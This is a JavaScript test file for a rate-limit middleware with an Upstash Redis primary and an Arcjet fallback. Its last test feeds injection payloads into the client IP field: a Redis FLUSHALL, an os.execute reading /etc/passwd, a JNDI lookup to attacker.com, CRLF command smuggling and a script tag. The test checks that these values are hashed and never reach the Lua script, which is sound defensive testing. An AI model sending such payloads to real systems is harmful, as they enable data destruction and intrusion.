import assert from "node:assert/strict";
import test from "node:test";

import { createRateLimitMiddleware } from "./rateLimit.middleware.js";

const createResponse = () => ({
  statusCode: null,
  body: null,
  status(code) {
    this.statusCode = code;
    return this;
  },
  json(body) {
    this.body = body;
    return this;
  },
});

const createLogger = () => ({
  error() {},
  warn() {},
});

const createRequest = () => ({
  ip: "test-client",
  socket: { remoteAddress: "test-client" },
});

test("uses Upstash and continues when the primary limit allows the request", async () => {
  let fallbackCalls = 0;
  let nextCalls = 0;
  const middleware = createRateLimitMiddleware({
    redisClient: { eval: async () => 1 },
    fallbackRateLimiter: { protect: async () => { fallbackCalls++; return { isDenied: () => false }; } },
    logger: createLogger(),
  });

  await middleware(createRequest(), createResponse(), () => { nextCalls++; });

  assert.equal(nextCalls, 1);
  assert.equal(fallbackCalls, 0);
});

test("uses Arcjet after the Upstash limit is exceeded", async () => {
  let fallbackCalls = 0;
  let nextCalls = 0;
  const middleware = createRateLimitMiddleware({
    redisClient: { eval: async () => 101 },
    fallbackRateLimiter: { protect: async () => { fallbackCalls++; return { isDenied: () => false }; } },
    logger: createLogger(),
  });

  await middleware(createRequest(), createResponse(), () => { nextCalls++; });

  assert.equal(fallbackCalls, 1);
  assert.equal(nextCalls, 1);
});

test("uses Arcjet when Upstash errors", async () => {
  let nextCalls = 0;
  const middleware = createRateLimitMiddleware({
    redisClient: { eval: async () => { throw new Error("Redis unavailable"); } },
    fallbackRateLimiter: { protect: async () => ({ isDenied: () => false }) },
    logger: createLogger(),
  });

  await middleware(createRequest(), createResponse(), () => { nextCalls++; });

  assert.equal(nextCalls, 1);
});

test("returns 429 when the Arcjet fallback denies", async () => {
  const response = createResponse();
  const middleware = createRateLimitMiddleware({
    redisClient: { eval: async () => 101 },
    fallbackRateLimiter: { protect: async () => ({ isDenied: () => true }) },
    logger: createLogger(),
  });

  await middleware(createRequest(), response, () => assert.fail("Denied requests must not continue"));

  assert.equal(response.statusCode, 429);
});

test("returns 503 when the Upstash and Arcjet fallback both fail", async () => {
  const response = createResponse();
  const middleware = createRateLimitMiddleware({
    redisClient: { eval: async () => { throw new Error("Redis unavailable"); } },
    fallbackRateLimiter: { protect: async () => { throw new Error("Arcjet unavailable"); } },
    logger: createLogger(),
  });

  await middleware(createRequest(), response, () => assert.fail("Unavailable limiters must not continue"));

  assert.equal(response.statusCode, 503);
});

test("hostile code injection payloads in req.ip are safely SHA-256 hashed and cannot alter Lua script or execute code", async () => {
  const hostilePayloads = [
    '"; redis.call("FLUSHALL"); --',
    '127.0.0.1; eval("os.execute(\'cat /etc/passwd\')")',
    '${jndi:ldap://attacker.com/a}',
    '127.0.0.1\r\nSET hijacked 1',
    '<script>alert(1)</script>',
    '\x00\x00\x00\x00',
  ];

  for (const hostileIp of hostilePayloads) {
    let capturedKey = null;
    let capturedScript = null;

    const middleware = createRateLimitMiddleware({
      redisClient: {
        eval: async (script, numkeys, key, windowMs) => {
          capturedScript = script;
          capturedKey = key;
          return 1;
        },
      },
      fallbackRateLimiter: { protect: async () => ({ isDenied: () => false }) },
      logger: createLogger(),
    });

    let nextCalled = false;
    await middleware({ ip: hostileIp }, createResponse(), () => { nextCalled = true; });

    assert.equal(nextCalled, true, "Middleware continues when count is under limit");
    // Verify key format: strictly matches let-connect:api-rate-limit:<64 hex chars>
    assert.match(
      capturedKey,
      /^let-connect:api-rate-limit:[0-9a-f]{64}$/,
      `Hostile IP ${hostileIp} must be strictly hashed into a 64-character hex digest`,
    );
    // Verify script is unchanged static Lua constant
    assert.ok(capturedScript.includes('local count = redis.call("INCR", KEYS[1])'));
    assert.ok(!capturedScript.includes(hostileIp), "Hostile payload must never be injected into script body");
  }
});
